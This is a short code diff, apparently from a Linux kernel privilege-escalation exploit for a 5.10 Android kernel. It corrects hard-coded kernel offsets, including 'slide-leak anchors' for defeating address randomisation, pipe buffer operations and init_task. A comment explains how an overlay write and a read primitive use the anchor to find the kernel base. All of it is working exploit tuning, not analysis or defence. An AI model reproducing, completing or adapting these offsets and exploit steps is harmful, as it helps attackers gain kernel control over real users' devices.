@@ -83,8 +83,12 @@
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
-/* --- slide-leak anchors (MEASURED, aristotle 5.10) --- */
-#define SLIDE_NFULNL_LOGGER_OFF 0x02771450ULL      /* nfulnl_logger */
+/* --- slide-leak anchors (MEASURED, aristotle 5.10) ---
+ * NOTE: the overlay writes SLIDE_LOGGERS_0_1 as the rb parent, and read_stext
+ * derives stext from p0_alias_image_offset(SLIDE_NFULNL_LOGGER); these must be
+ * the SAME anchor (the working 5.10 reference oppo-ghostlock sets them equal).
+ * So SLIDE_NFULNL_LOGGER == SLIDE_LOGGERS_0_1 == &loggers[0][1]. */
+#define SLIDE_NFULNL_LOGGER_OFF 0x02771380ULL      /* = SLIDE_LOGGERS_0_1 (&loggers[0][1]) */
 #define SLIDE_LOGGERS_0_1_OFF 0x02771380ULL        /* &loggers[0][1] = loggers(0x2771378)+8 */
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02886cf8ULL /* boot_id ctl_table.data = random_table(0x2886bf0)+0x108 */
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
